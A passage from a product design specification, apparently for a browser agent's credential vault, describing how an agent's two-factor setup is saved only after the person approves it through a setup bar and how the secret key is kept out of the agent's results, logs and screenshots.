  draws (the panel watch's own test), read from the tab's picture with Vision. Every key found is kept out of results
  and makes the document a filled one (section 5.3), as when the panel sees it. An export of several accounts is not
  taken this way. A page whose setup the vault holds fills its code without asking.
- **Asking:** the task's browser panel opens on the tab, as for a handoff, with the setup bar (section 14.3) saying the
  agent set it up ("Save the two-factor code the agent set up for github.com in “GitHub”?", or "Replace the two-factor
  code in “GitHub” with the one the agent set up?" when the item has one), and a notification says what is asked. The
  item it goes into is chosen as the bar always chooses it, and its arrow offers the site's other items or a new one.
  The agent's call waits, as `browser_handoff` does (600 seconds, within the harness's limit); after that the bar stays
  until the person answers or the turn ends, and a call on the field waits again. While it waits, the panel's own offer
  for the same page does not take its place. The phone's remote connection shows the ask as it shows a handoff: I'm
  done saves where the bar would by default, and Decline is Not Now.
- **Save:** the agent's call keeps the code in the item the person chose, for the site, then takes that item and puts in
  its current code, on the path of every code fill (sections 5.2 and 5.3; the item's agent policy applies). The result says
  the person saved the setup and names the item.
- **Not Now, the page moving on, the turn ending, the tab closing:** nothing is saved or filled, and the agent hears
  which.

### 20.2 Rules shared with the vault

- The key never reaches the agent: no result, log or bar carries it, and the agent's screenshots and scripts are
  refused on the page (section 5.3). The QR is read only inside the Yardlet process.
- Nothing is kept without the person's Save. The site saved is the page's registrable domain from the browser's main
  frame origin, as for every setup the person saves.
- No settings, menu items or shortcuts of its own. The bar is the setup bar with its own words for the agent's ask;
  with the vault off, the agent's code fill asks nothing.
